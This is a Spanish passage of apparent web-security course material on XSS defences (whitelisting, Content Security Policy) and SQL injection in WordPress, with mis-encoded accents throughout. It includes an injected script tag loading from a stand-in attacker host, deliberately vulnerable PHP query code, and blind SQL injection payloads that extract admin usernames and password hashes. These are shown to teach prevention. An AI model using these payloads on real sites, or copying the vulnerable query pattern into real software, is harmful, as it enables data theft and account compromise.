Incluso si se desarrollara una lista negra perfecta, fracasar√≠a si se a√±adiera al navegador una nueva caracter√≠stica que permitiera el uso malicioso. Por ejemplo, una lista negra de validaci√≥n de HTML desarrollada antes de la introducci√≥n del onmousewheelatributo HTML5 no lograr√≠a impedir que un atacante utilice ese atributo para realizar un ataque XSS. Este inconveniente es especialmente significativo en el desarrollo web, que se compone de muchas tecnolog√≠as diferentes que se actualizan constantemente.

Debido a estos inconvenientes, se desaconseja encarecidamente la inclusi√≥n en listas negras como estrategia de clasificaci√≥n. La inclusi√≥n en listas blancas suele ser un enfoque mucho m√°s seguro, como describiremos a continuaci√≥n.

- **Lista blanca**

*La creaci√≥n de listas blancas* es esencialmente lo opuesto a las listas negras: en lugar de definir un patr√≥n prohibido, un enfoque de lista blanca define un patr√≥n permitido y marca la entrada como no v√°lida si no *coincide* con este patr√≥n.

A diferencia del ejemplo anterior de lista negra, un ejemplo de lista blanca ser√≠a permitir a los usuarios enviar URL personalizadas que contengan solo los protocolos http:y https:nada m√°s. Este enfoque marcar√≠a autom√°ticamente una URL como no v√°lida si tuviera el protocolo javascript:, incluso si apareciera como " Javascript:" o " &#106;avascript:".

En comparaci√≥n con las listas negras, las listas blancas tienen dos ventajas principales:

1. Sencillez: Describir con precisi√≥n un conjunto de cadenas seguras suele ser mucho m√°s f√°cil que identificar el conjunto de todas las cadenas maliciosas. Esto es especialmente cierto en situaciones comunes en las que la entrada del usuario s√≥lo necesita incluir un subconjunto muy limitado de la funcionalidad disponible en un navegador. Por ejemplo, la lista blanca descrita anteriormente que permite solo URL con los protocolos http:o https:es muy simple y perfectamente adecuada para los usuarios en la mayor√≠a de situaciones.
2. **Longevidad:** A diferencia de una lista negra, una lista blanca generalmente no quedar√° obsoleta cuando se agregue una nueva funci√≥n al navegador. Por ejemplo, una lista blanca de validaci√≥n de HTML que permita solo el titleatributo en elementos HTML seguir√≠a siendo segura incluso si se desarrollara antes de la introducci√≥n del onmousewheelatributo HTML5.

## **Resultado de la validaci√≥n**

Cuando la entrada se ha marcado como no v√°lida, se puede realizar una de dos acciones:

> Rechazo: La entrada simplemente se rechaza, lo que impide que se utilice en otras partes del sitio web.
> 

> Higienizaci√≥n: Todas las partes no v√°lidas de la entrada se eliminan y el sitio web utiliza normalmente la entrada restante.
> 

De estos dos, el rechazo es el enfoque m√°s sencillo de implementar. Dicho esto, la desinfecci√≥n puede ser m√°s √∫til ya que permite una gama m√°s amplia de aportaciones por parte del usuario. Por ejemplo, si un usuario env√≠a un n√∫mero de tarjeta de cr√©dito, una rutina de desinfecci√≥n que elimine todos los caracteres que no sean d√≠gitos evitar√≠a la inyecci√≥n de c√≥digo y permitir√≠a al usuario ingresar el n√∫mero con o sin guiones.

Si decide implementar una desinfecci√≥n, debe asegurarse de que la rutina de desinfecci√≥n en s√≠ no utilice un enfoque de lista negra . Por ejemplo, la URL " Javascript:...", incluso cuando se identifica como no v√°lida mediante un enfoque de lista blanca, superar√≠a una rutina de desinfecci√≥n que simplemente elimina todas las instancias de " javascript:". Por este motivo, siempre que sea posible, se deben utilizar bibliotecas y marcos bien probados para la desinfecci√≥n.

### **¬øQu√© t√©cnica de prevenci√≥n utilizar?**

La codificaci√≥n debe ser su primera l√≠nea de defensa contra XSS, porque su prop√≥sito es neutralizar los datos para que no puedan interpretarse como c√≥digo. En algunos casos, la codificaci√≥n debe complementarse con validaci√≥n, como se explic√≥ anteriormente. Esta codificaci√≥n y validaci√≥n deben ser salientes, porque solo cuando la entrada se incluye en una p√°gina se sabe para qu√© contexto codificar y validar.

Como segunda l√≠nea de defensa, debe utilizar la validaci√≥n entrante para desinfectar o rechazar datos que son claramente inv√°lidos, como los enlaces que utilizan el javascript:protocolo. Si bien esto por s√≠ solo no puede proporcionar seguridad total, es una precauci√≥n √∫til si en alg√∫n momento la codificaci√≥n y validaci√≥n saliente se realiza incorrectamente debido a errores o equivocaciones.

<aside>
üëâ Si estas dos l√≠neas de defensa se utilizan de forma coherente, su sitio web estar√° protegido de ataques XSS. Sin embargo, debido a la complejidad de crear y mantener un sitio web completo, puede resultar dif√≠cil lograr una protecci√≥n total utilizando √∫nicamente un manejo seguro de la entrada. Como tercera l√≠nea de defensa, tambi√©n debes hacer uso de la Pol√≠tica de seguridad de contenido (CSP), que describiremos a continuaci√≥n.

</aside>

### **Pol√≠tica de seguridad de contenido (CSP)**

La desventaja de protegerse contra XSS utilizando √∫nicamente un manejo de entrada seguro es que incluso una sola falla de seguridad puede comprometer su sitio web. Un est√°ndar web reciente llamado Pol√≠tica de seguridad de contenido (CSP) puede mitigar este riesgo.

CSP se utiliza para restringir el navegador que ve su p√°gina para que solo pueda usar recursos descargados de fuentes confiables. Un *recurso* es un script, una hoja de estilo, una imagen o alg√∫n otro tipo de archivo al que hace referencia la p√°gina. Esto significa que incluso si un atacante logra inyectar contenido malicioso en su sitio web, CSP puede impedir que se ejecute.

CSP se puede utilizar para hacer cumplir las siguientes reglas:

> Sin fuentes no confiables: Los recursos externos s√≥lo se pueden cargar desde un conjunto de fuentes confiables claramente definidas.
> 
> 
> **Sin recursos en l√≠nea:** JavaScript y CSS en l√≠nea no se evaluar√°n.
> 
> **Noeval:** La funci√≥n JavaScript evalno se puede utilizar.
> 
> **CSP en acci√≥n:** En el siguiente ejemplo, un atacante logr√≥ inyectar c√≥digo malicioso en una p√°gina:
> 

> <html>
> 
> 
> Latest comment:
> 
> **<script src="http://attacker/malicious‚Äëscript.js"></script>**
> 
> </html>
> 

Con una pol√≠tica CSP correctamente definida, el navegador no se cargar√≠a ni ejecutar√≠a malicious‚Äëscript.jsporque [http://attacker/no](http://attacker/no) estar√≠a en el conjunto de fuentes confiables. Aunque en este caso el sitio web no pudo manejar de forma segura la entrada del usuario, la pol√≠tica del CSP evit√≥ que la vulnerabilidad causara alg√∫n da√±o.

Incluso si el atacante hubiera inyectado el c√≥digo del script en l√≠nea en lugar de vincularlo a un archivo externo, una pol√≠tica de CSP correctamente definida que no permitiera JavaScript en l√≠nea tambi√©n habr√≠a evitado que la vulnerabilidad causara alg√∫n da√±o.

### **¬øC√≥mo habilitar CSP?**

De forma predeterminada, los navegadores no aplican CSP. Para habilitar CSP en su sitio web, las p√°ginas deben tener un encabezado HTTP adicional: Content‚ÄëSecurity‚ÄëPolicy. Cualquier p√°gina enviada con este encabezado tendr√° su pol√≠tica de seguridad respetada por el navegador que la cargue, siempre que el navegador admita CSP.

Dado que la pol√≠tica de seguridad se env√≠a con cada respuesta HTTP, es posible que un servidor establezca su pol√≠tica p√°gina por p√°gina. Se puede aplicar la misma pol√≠tica a un sitio web completo proporcionando el mismo encabezado CSP en cada respuesta.

El valor del Content‚ÄëSecurity‚ÄëPolicyencabezado es una cadena que define una o m√°s pol√≠ticas de seguridad que entrar√°n en vigor en su sitio web. La sintaxis de esta cadena se describir√° a continuaci√≥n.

*Los encabezados de ejemplo en esta secci√≥n utilizan nuevas l√≠neas y sangr√≠a para mayor claridad; esto no deber√≠a estar presente en un encabezado real.*

### **Sintaxis de CSP**

La sintaxis de un encabezado CSP es la siguiente:

> Content‚ÄëSecurity‚ÄëPolicy:
> 
> 
> *directive* *source‚Äëexpression*, *source‚Äëexpression*, ...;
> 
> *directive* ...;
> 
> ...
> 

Esta sintaxis se compone de dos elementos:

- **Las directivas** son cadenas que especifican un tipo de recurso, tomadas de una lista predefinida.
- **Las expresiones de origen** son patrones que describen uno o m√°s servidores desde donde se pueden descargar recursos.

Para cada directiva, las expresiones fuente dadas definen qu√© fuentes se pueden usar para descargar recursos del tipo respectivo.

### **Directivas**

Las directivas que se pueden utilizar en un encabezado CSP son las siguientes:

- connect‚Äësrc
- font‚Äësrc
- frame‚Äësrc
- img‚Äësrc
- media‚Äësrc
- object‚Äësrc
- script‚Äësrc
- style‚Äësrc

Adem√°s de estas, la directiva especial default‚Äësrcse puede utilizar para proporcionar un valor predeterminado para todas las directivas que no se han incluido en el encabezado.

**Expresiones fuente**

La sintaxis de una expresi√≥n fuente es la siguiente:

> protocol://host‚Äëname:port‚Äënumber

El nombre de host puede comenzar con *., lo que significa que se permitir√° cualquier subdominio del nombre de host proporcionado. De manera similar, el n√∫mero de puerto puede ser *, lo que significa que se permitir√°n todos los puertos. Adem√°s, se pueden omitir el protocolo y el n√∫mero de puerto. Finalmente, se puede dar un protocolo propio, lo que permite exigir que todos los recursos se carguen mediante HTTPS.

Adem√°s de la sintaxis anterior, una expresi√≥n fuente puede ser alternativamente una de cuatro palabras clave con significado especial (comillas incluidas):

> 'none' No permite recursos.
> 
> 
> **'self'** Permite recursos del host que sirvi√≥ la p√°gina.
> 
> **'unsafe‚Äëinline'** Permite recursos incrustados en la p√°gina, como <script>elementos en l√≠nea, <style>elementos y javascript:URL.
> 
> **'unsafe‚Äëeval'** Permite el uso de la evalfunci√≥n JavaScript.
> 

Tenga en cuenta que siempre que se utiliza CSP, los recursos en l√≠nea y evalno se permiten autom√°ticamente de forma predeterminada. Usar 'unsafe‚Äëinline'y 'unsafe‚Äëeval'es la √∫nica forma de permitirlos.

**Una pol√≠tica de ejemplo**

> Content‚ÄëSecurity‚ÄëPolicy:
> 
> 
> script‚Äësrc 'self' scripts.example.com;
> 
> media‚Äësrc 'none';
> 
> img‚Äësrc *;
> 
> default‚Äësrc 'self' [http://*.example.com](about:blank)
> 

En esta pol√≠tica de ejemplo, la p√°gina est√° sujeta a las siguientes restricciones:

- Los scripts s√≥lo se pueden descargar desde el host que sirve la p√°gina y desde scripts.example.com.
- Los archivos de audio y video no se pueden descargar desde ning√∫n lugar.
- Los archivos de imagen se pueden descargar desde cualquier host.
- Todos los dem√°s recursos se pueden descargar √∫nicamente desde el host que sirve la p√°gina y desde cualquier subdominio de example.com.

### **Estado del PSIC**

A partir de junio de 2013, la Pol√≠tica de seguridad de contenidos es [una recomendaci√≥n candidata del W3C](http://www.w3.org/TR/CSP/) . Lo est√°n implementando los proveedores de navegadores, pero algunas partes todav√≠a son espec√≠ficas del navegador. En particular, el encabezado HTTP a utilizar puede diferir entre navegadores. Antes de utilizar CSP hoy, consulte la documentaci√≥n de los navegadores que desea admitir.

## **Resumen**

**Resumen: descripci√≥n general de XSS**

- XSS es un ataque de inyecci√≥n de c√≥digo posible gracias al manejo inseguro de la entrada del usuario.
- Un ataque XSS exitoso permite a un atacante ejecutar JavaScript malicioso en el navegador de la v√≠ctima.
- Un ataque XSS exitoso compromete la seguridad tanto del sitio web como de sus usuarios.

**Resumen: ataques XSS**

- Hay tres tipos principales de ataques XSS:
- XSS persistente, donde la entrada maliciosa se origina en la base de datos del sitio web.
- XSS reflejado, donde la entrada maliciosa se origina a partir de la solicitud de la v√≠ctima.
- XSS basado en DOM, donde la vulnerabilidad est√° en el c√≥digo del lado del cliente en lugar del c√≥digo del lado del servidor.
- Todos estos ataques se realizan de diferentes maneras pero tienen el mismo efecto si tienen √©xito.

**Resumen: Prevenci√≥n de XSS**

- La forma m√°s importante de prevenir ataques XSS es realizar un manejo de entrada seguro.
- La mayor√≠a de las veces, la codificaci√≥n debe realizarse siempre que se incluyan entradas del usuario en una p√°gina.
- En algunos casos, la codificaci√≥n debe ser reemplazada o complementada con validaci√≥n.
- El manejo seguro de la entrada debe tener en cuenta en qu√© contexto de una p√°gina se inserta la entrada del usuario.
- Para evitar todo tipo de ataques XSS, se debe realizar un manejo seguro de la entrada tanto en el c√≥digo del lado del cliente como del del servidor.
- La pol√≠tica de seguridad de contenido proporciona una capa adicional de defensa para cuando falla el manejo seguro de la entrada.

### **Conclusi√≥n**

Cabe se√±alar que existe una superposici√≥n en la terminolog√≠a utilizada actualmente para describir XSS: un ataque XSS basado en DOM tambi√©n es persistente o reflejado al mismo tiempo; No es un tipo de ataque separado. No existe una terminolog√≠a ampliamente aceptada que cubra todos los tipos de XSS sin superposici√≥n. Sin embargo, independientemente de la terminolog√≠a utilizada para describir XSS, lo m√°s importante a identificar sobre cualquier ataque es de d√≥nde proviene la entrada maliciosa y d√≥nde se encuentra la vulnerabilidad.

Si sigue las pautas b√°sicas de esta p√°gina, podr√° evitar las vulnerabilidades m√°s comunes que se introducen en el c√≥digo. En general, dedicar tiempo a la validaci√≥n de entradas y la desinfecci√≥n y escape de salidas har√° que su aplicaci√≥n sea segura.

Al elegir funciones para desinfecci√≥n y escape, elija la funci√≥n que m√°s se acerque a su caso de uso espec√≠fico. Si est√° enviando datos a un atributo HTML, utilice una funci√≥n de desinfecci√≥n o escape espec√≠fica para los atributos HTML. Esto le brindar√° la mejor combinaci√≥n de rendimiento y seguridad de la aplicaci√≥n.

Si puede evitar las vulnerabilidades XSS y proteger la salida de su aplicaci√≥n, evitar√° casi la mitad de todas las vulnerabilidades que podr√≠an introducirse en su aplicaci√≥n.

**REFERENCIAS**

- [Documentaci√≥n filter_var() de PHP.](http://php.net/manual/en/function.filter-var.php)
- [Filtros de validaci√≥n de PHP.](http://php.net/manual/en/filter.filters.validate.php)
- [Filtros de sanitizaci√≥n de PHP.](http://php.net/manual/en/filter.filters.sanitize.php)
- [Funciones de WordPress para desinfecci√≥n y escape (art√≠culo sobre Validaci√≥n de datos).](https://codex.wordpress.org/Data_Validation)
- [Otro art√≠culo de WordPress sobre validaci√≥n, desinfecci√≥n y escape de datos de usuario.](https://codex.wordpress.org/Validating_Sanitizing_and_Escaping_User_Data)
- [Art√≠culo de OWASP sobre XSS.](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
- [Hoja de referencia de OWASP XSS.](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
- [Art√≠culo de seguridad de aplicaciones de Google sobre XSS.](https://www.google.com/about/appsecurity/learning/xss/)
- [https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html)
- [https://cwe.mitre.org/data/definitions/79.html](https://cwe.mitre.org/data/definitions/79.html)
- [http://projects.webappsec.org/Cross-Site-Scripting](http://projects.webappsec.org/Cross-Site-Scripting)
- [https://owasp.org/Top10/A03_2021-Injection/](https://owasp.org/Top10/A03_2021-Injection/)
- [https://owasp.org/www-project-web-security-testing-guide](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
- [https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html)

# SQL Injection

La inyecci√≥n SQL es un tipo de ataque de inyecci√≥n en el cual un atacante inserta c√≥digo malicioso en una consulta SQL para ejecutar comandos no deseados en la base de datos. Los atacantes pueden utilizar la inyecci√≥n de comandos para ejecutar comandos arbitrarios en el sistema, lo que podr√≠a permitirles obtener acceso no autorizado, modificar o eliminar datos, o incluso tomar el control total del sistema. Las inyecciones a menudo se realizan a trav√©s de campos de entrada, como formularios web, par√°metros de URL o encabezados HTTP.

Los complementos de WordPress m√°s √∫tiles tienen alg√∫n tipo de interacci√≥n con la base de datos. La entrada del usuario se env√≠a con frecuencia a la base de datos, ya sea porque necesita almacenarse en la base de datos, necesita modificar algo en la base de datos o porque se utiliza como parte de una declaraci√≥n SELECT. Si la entrada del usuario no se valida ni se escapa correctamente, un atacante puede reemplazar esa entrada del usuario con comandos que puede enviar directamente a la base de datos.

Hay dos tipos de inyecci√≥n SQL. Una vulnerabilidad de inyecci√≥n SQL "cl√°sica" es aquella en la que la entrada del usuario sin filtrar permite a un atacante enviar comandos a la base de datos y la salida se env√≠a de vuelta al atacante. Una vulnerabilidad de inyecci√≥n SQL "ciega" se produce cuando el atacante puede enviar comandos a la base de datos pero en realidad no ve la salida de la base de datos.

Seg√∫n el an√°lisis de Wordfence las vulnerabilidades de inyecci√≥n SQL son la segunda vulnerabilidad m√°s com√∫n que se encuentra en los complementos de WordPress.

![SQL 1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql1.png?raw=true)

[https://www.wordfence.com/learn/how-to-prevent-sql-injection-attacks/](https://www.wordfence.com/learn/how-to-prevent-sql-injection-attacks/)

C√≥mo funciona una vulnerabilidad de inyecci√≥n SQL cl√°sica

Para comprender c√≥mo funciona una vulnerabilidad de inyecci√≥n SQL cl√°sica, veamos un ejemplo de WordPress:

| 1
2
3 | global $wpdb;
$title = $wpdb->get_var("select post_title from " . $wpdb->posts . " where ID=" . $_GET['id']);
echo $title;
 |
| --- | --- |

El c√≥digo anterior es un ejemplo de una vulnerabilidad de inyecci√≥n SQL (SQLi). Es una vulnerabilidad de SQLi porque la entrada del usuario en $_GET['id'] se env√≠a directamente a la base de datos sin desinfecci√≥n ni escape. Esto permite a un atacante enviar comandos directamente a la base de datos.

Luego, la salida de la base de datos se env√≠a directamente al navegador del usuario. Debido a que el resultado se env√≠a al navegador, esto convierte a la vulnerabilidad en una vulnerabilidad SQLi cl√°sica, a diferencia de una vulnerabilidad de inyecci√≥n SQL ciega, que se analiza a continuaci√≥n.

Al utilizar esta vulnerabilidad, un atacante puede enviar comandos directamente a la base de datos. Estos incluyen comandos SELECT para descargar su base de datos completa, incluida la informaci√≥n de identificaci√≥n personal (PII) del usuario. En algunos casos, tambi√©n incluye comandos INSERTAR y ACTUALIZAR para crear nuevas cuentas de usuario o modificar cuentas de usuario existentes.

Corregir la vulnerabilidad anterior es relativamente f√°cil. En WordPress simplemente necesita usar el m√©todo de preparaci√≥n que desinfectar√° y escapar√° autom√°ticamente cualquier dato que env√≠e a la base de datos. El c√≥digo anterior se puede modificar de la siguiente manera para eliminar la vulnerabilidad SQLi:

| 1
2
3 | global $wpdb;
$title = $wpdb->get_var($wpdb->prepare("select post_title from " . $wpdb->posts . " where ID=%d", $_GET['id']));
echo $title;
 |
| --- | --- |

Tenga en cuenta que utilizamos el m√©todo $wpdb->prepare() para escapar de los datos que estamos enviando a la base de datos. Tiene una sintaxis similar a la funci√≥n sprintf() que le permite utilizar marcadores de posici√≥n. %d es un n√∫mero entero, %f es un flotante (o decimal) y %s es una cadena (o texto). Si utiliza %s como marcador de posici√≥n, no necesita incluir comillas, ya que se agregan autom√°ticamente.

### ¬øC√≥mo funciona una inyecci√≥n SQL ciega?

Una vulnerabilidad de inyecci√≥n SQL ciega se parece a la siguiente:

| 1
2
3 | global $wpdb;
$title = $wpdb->get_var("select post_title from " . $wpdb->posts . " where ID=" . $_GET['id']);
//Do something with title, but don't echo.
 |
| --- | --- |

En el ejemplo anterior, la entrada del usuario sin procesar y no desinfectada se env√≠a directamente a la base de datos concatenando la variable $_GET['id'] directamente a la consulta SQL. Para corregir esta vulnerabilidad, simplemente usar√≠a el m√©todo prepare() como se indic√≥ anteriormente para desinfectar y escapar de cualquier entrada de la base de datos.

La diferencia aqu√≠ es que el resultado nunca se env√≠a al navegador. Una vulnerabilidad SQLi ciega es tan grave como una vulnerabilidad SQLi normal porque, en algunos casos, un atacante puede insertar o actualizar datos f√°cilmente en su base de datos. La diferencia es que resulta m√°s dif√≠cil extraer datos de la base de datos porque el atacante no puede ver el resultado de la base de datos porque no est√° escrito en el navegador web.

## Ataques SQL ciegos basados ‚Äã‚Äãen el tiempo

Generalmente, hay dos formas en que un atacante extrae datos de una base de datos mediante un ataque de inyecci√≥n SQL ciega. El primero es utilizar un ataque basado en el tiempo. Supongamos que, utilizando la vulnerabilidad SQLi anterior, un atacante puede enviar cualquier comando a la base de datos, pero no puede ver el resultado. S√≥lo pueden ver la p√°gina web resultante.

Un atacante podr√≠a hacerle a la base de datos una pregunta como ‚Äú¬øLa primera letra de la primera cuenta de administrador comienza con 'a'? Si es as√≠, duerme 5 segundos y si no es as√≠, no duermas nada. Si la p√°gina web tarda menos de 5 segundos en generarse y regresar al navegador web, saben que la cuenta de administrador no comienza con la letra 'a' y pasan a la siguiente letra, 'b', y preguntan. la misma pregunta.

Con esta t√©cnica, un atacante puede lanzar un ataque basado en el tiempo en un sitio web y determinar los nombres de las cuentas de administrador y puede extraer contrase√±as de usuario con hash.

El SQL real enviado a la base de datos podr√≠a verse similar al siguiente:

| 1
2
3
4
5
6 | select post_title from wp_posts where ID=1
¬†¬†union select IF(
¬†¬†¬†¬†substring(wp_users.user_login,1,1)='a',
¬†¬†¬†¬†BENCHMARK(5000000,ENCODE('blah','asdf')),
¬†¬†¬†¬†null)
¬†¬†from wp_users where ID=1
 |
| --- | --- |

Lo que dice este SQL es "seleccione el t√≠tulo de la publicaci√≥n donde el ID de la publicaci√≥n es 1, pero combine en una consulta que llevar√° mucho tiempo si suponemos que la cuenta de usuario con ID 1 (que generalmente es una cuenta de administrador) tiene la letra ' a' como primera letra del nombre de usuario‚Äù.

Cuando se ejecuta esta consulta, si la p√°gina tarda mucho en cargarse, el atacante ha adivinado correctamente la primera letra del nombre de usuario del administrador. Luego pueden pasar a las letras dos y tres hasta que tengan su nombre de usuario de administrador. Una vez que lo tengan, pueden extraer su contrase√±a hash de administrador, su correo electr√≥nico de administrador, cualquier correo electr√≥nico de usuario o cualquier dato que deseen, siempre que se tomen el tiempo suficiente para ejecutar el ataque.

Recuerde, estos ataques son automatizados y las conjeturas incorrectas no toman tiempo, por lo que los datos se pueden extraer con relativa rapidez utilizando esta t√©cnica.

Ataques de inyecci√≥n SQL ciegos basados ‚Äã‚Äãen contenido

Un ataque de inyecci√≥n SQL ciega basado en contenido es otra forma en que un atacante extrae datos de una base de datos cuando no puede ver la salida de la base de datos.

Si la consulta que genera el contenido es la siguiente (recuerde, el resultado de la consulta no se env√≠a al usuario)

| 1 | select post_status from wp_posts where ID=1 |

Supongamos que el valor '1' anterior es un par√°metro de consulta sin filtrar agregado a la consulta de la base de datos como en nuestro ejemplo anterior. Por tanto, un atacante puede controlar todo el texto despu√©s de 'ID='.

Un atacante puede agregar lo siguiente a la consulta para verificar que si incluye una condici√≥n falsa, ver√° generado contenido inusual:

| 1 | select post_status from wp_posts where ID=1 and 1=2 |

Obviamente, 1 no es igual a 2, por lo que en la consulta anterior la base de datos devolver√° un conjunto de resultados vac√≠o. El atacante examinar√° la p√°gina resultante y si es una p√°gina sin contenido o un mensaje de error que dice algo como "sin contenido", sabr√° c√≥mo se ve la respuesta de una consulta vac√≠a con una condici√≥n falsa. Luego, el atacante puede incluir algo como lo siguiente:

| 1
2
3 | select post_status from wp_posts where ID=1
¬†¬†and (select ID from wp_users where
¬†¬†user_login='admin' and ID=1)
 |
| --- | --- |

La consulta anterior estar√° vac√≠a si el usuario de la base de datos con ID 1 no tiene el nombre de usuario 'admin'. Sin embargo, devolver√° un resultado normal no vac√≠o al navegador si el usuario con ID 1 tiene el nombre de usuario "admin". Con esta t√©cnica, un atacante puede extraer datos de una base de datos comprobando si hay respuestas vac√≠as y no vac√≠as de la aplicaci√≥n.

Otro ejemplo de una consulta de inyecci√≥n SQL ciega basada en contenido es:

| 1
2
3 | select post_status from wp_posts where
¬†¬†ID=1 and (select 1 from wp_users where
¬†¬†substring(user_pass,1,1) = 'a' and ID=1) |
| --- | --- |

La consulta anterior verificar√° si la primera letra de la contrase√±a hash para el usuario con ID 1 es una 'a'. Con esta t√©cnica, un atacante puede revisar cada car√°cter y extraer la contrase√±a hash de las cuentas de administrador.

## Consecuencias

> Las consecuencias de una inyecci√≥n SQL pueden incluir:
> 
- **P√©rdida o alteraci√≥n de datos:** el atacante puede eliminar, modificar o extraer informaci√≥n de la base de datos.
- **Inestabilidad del sistema:** el c√≥digo malicioso puede causar que la base de datos deje de funcionar correctamente, lo que puede resultar en tiempos de inactividad y p√©rdida de disponibilidad.
- **Dificultad para detectar y mitigar el ataque:** debido a que el c√≥digo malicioso se inserta en una consulta SQL leg√≠tima.
- **Posibilidad de propagaci√≥n del ataque:** si el atacante tiene acceso a datos sensibles, como contrase√±as de usuario, puede utilizarlos para propagar el ataque a otros sistemas.
- **Acceso no autorizado:** un atacante podr√≠a obtener acceso no autorizado al sistema o a la aplicaci√≥n web, lo que le permitir√≠a acceder a informaci√≥n confidencial o realizar acciones maliciosas en el sistema.
- **Modificaci√≥n de datos:** un atacante podr√≠a modificar, eliminar o agregar datos al sistema, lo que podr√≠a tener graves consecuencias en la integridad y exactitud de los datos.
- **Ejecuci√≥n de c√≥digo malicioso:** un atacante podr√≠a ejecutar c√≥digo malicioso en el sistema, lo que podr√≠a resultar en la toma de control del sistema o en el robo de informaci√≥n confidencial.
- **Denegaci√≥n de servicio:** un atacante podr√≠a utilizar la inyecci√≥n de comando para sobrecargar el sistema y hacer que se vuelva inoperable.
- **La no correcci√≥n de esta falla puede causar divulgaci√≥n no autorizada de su informaci√≥n y la de sus clientes que podr√≠a dar lugar a fraude, usurpaci√≥n de identidad y a sanciones reglamentarias.**
- Para evitar la inyecci√≥n de comandos, es importante validar y filtrar todas las entradas de usuario en las aplicaciones web, y evitar el uso de comandos de shell en aplicaciones web. Adem√°s, es importante mantener todas las aplicaciones y sistemas actualizados y parcheados para evitar que se exploten vulnerabilidades conocidas.

## **Soluci√≥n**

> Para prevenir y solucionar la inyecci√≥n SQL avanzada, se pueden tomar las siguientes medidas:
> 
- **Validar y sanitizar todas las entradas de datos**: Aseg√∫rese de que todas las entradas de datos, ya sean proporcionadas por los usuarios o por otras fuentes, sean validadas y sanitizadas adecuadamente antes de ser utilizadas en una consulta SQL.
- **Utilizar consultas parametrizadas:** En lugar de construir una consulta SQL din√°micamente utilizando cadenas de texto, utilice consultas parametrizadas que permitan que los par√°metros sean pasados como argumentos separados. Esto reducir√° la posibilidad de inyecci√≥n SQL, ya que los valores de los par√°metros son tratados como datos, no como parte de la consulta SQL.
- **Limitar los permisos de la base de datos:** Aseg√∫rese de que los usuarios de la base de datos tengan solo los permisos necesarios para realizar sus funciones y nada m√°s. Esto limitar√° el alcance de cualquier posible ataque.
- **Utilizar herramientas de seguridad y pruebas de penetraci√≥n:** Realice pruebas regulares de seguridad y pruebas de penetraci√≥n en la aplicaci√≥n para identificar posibles vulnerabilidades y errores de seguridad. Tambi√©n puede utilizar herramientas de seguridad de terceros para proteger la aplicaci√≥n contra la inyecci√≥n SQL.
- Actualizaci√≥n y parcheo del software de la base de datos y uso de firewalls de aplicaci√≥n web (WAF)

Es una tarea dif√≠cil determinar si una cadena de usuario es maliciosa o no. Por lo tanto, la mejor manera de hacerlo es ‚Äúescapar‚Äù de los caracteres especiales en la entrada del usuario. Puede escapar una cadena antes de construir la consulta en PHP usando la funci√≥n mysql_escape_string(). O en MySQL usando la funci√≥n mysqli_real_escape_string().

Mientras se muestra la salida como HTML, tambi√©n tendr√° que convertir la cadena para asegurarse de que los caracteres especiales no interfieren con el marcado HTML. Puede convertir caracteres especiales en PHP usando la funci√≥n htmlspecialchars(). Alternativamente, puede usar sentencias preparadas para evitar las inyecciones de SQL. Una sentencia preparada es una plantilla de una consulta SQL, en la que se especifican los par√°metros en una etapa posterior para ejecutarla. Aqu√≠ hay un ejemplo de una declaraci√≥n preparada en PHP y MySQLi.

`$query = $mysql_connection->prepare("select * from user_table where username = ? and password = ?");`

`$query->execute(array($username, $password));`

<aside>
üìñ En resumen, para solucionar y prevenir la inyecci√≥n SQL avanzada, es necesario validar y sanitizar todas las entradas de datos, utilizar consultas parametrizadas, limitar los permisos de la base de datos y utilizar herramientas de seguridad y pruebas de penetraci√≥n.

</aside>

REFERENCIAS

- [https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [https://owasp.org/Top10/A03_2021-Injection/](https://owasp.org/Top10/A03_2021-Injection/)
- [https://owasp.org/www-project-web-security-testing-guide/v42/4Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [https://kinsta.com/es/blog/inyeccion-sql/](https://kinsta.com/es/blog/inyeccion-sql/)
- [https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html)

# **Pruebas de inyecci√≥n SQL: todo lo que necesita saber**

Para mejorar sus habilidades de pentester de aplicaciones web, es importante aprender a detectar vulnerabilidades de inyecci√≥n SQL. Profundizarwmoa en los principios y m√©todos de prueba que pueden descubrir los detalles de esta amenaza. Exploraremos t√©cnicas de prueba manuales, como analizar URL y formularios, comprender la interacci√≥n del usuario y el procesamiento de aplicaciones.

Adem√°s, proporcionaremos ejemplos reales de cargas √∫tiles de inyecci√≥n SQL que puede utilizar en sus propias pruebas. Para mejorar a√∫n m√°s sus habilidades, cubriremos la automatizaci√≥n con herramientas como SQLmap y Burp Suite, que ofrecen informaci√≥n de expertos de la industria sobre t√©cnicas modernas. Tambi√©n obtendr√° conocimientos sobre la interpretaci√≥n de mensajes de error complejos que son cruciales para identificar y resolver problemas. Al dominar las t√©cnicas b√°sicas y avanzadas descritas en este art√≠culo, podr√° mejorar la seguridad de sus aplicaciones y contribuir a un entorno digital m√°s seguro.

## **Comprender las inyecciones SQL**

Las inyecciones SQL son una vulnerabilidad inform√°tica que puede afectar aplicaciones web y bases de datos que utilizan el lenguaje SQL. Estos ataques aprovechan las vulnerabilidades en los formularios de entrada y las URL dentro de las aplicaciones. Insertan intencionalmente declaraciones SQL da√±inas en las solicitudes del servidor. El objetivo principal de un ataque de inyecci√≥n SQL es controlar c√≥mo funciona la base de datos. Esto permite el acceso no autorizado a datos confidenciales extray√©ndolos, modific√°ndolos o elimin√°ndolos.

**Los ataques de inyecci√≥n SQL se pueden dividir en varias categor√≠as. Los m√°s conocidos son:**

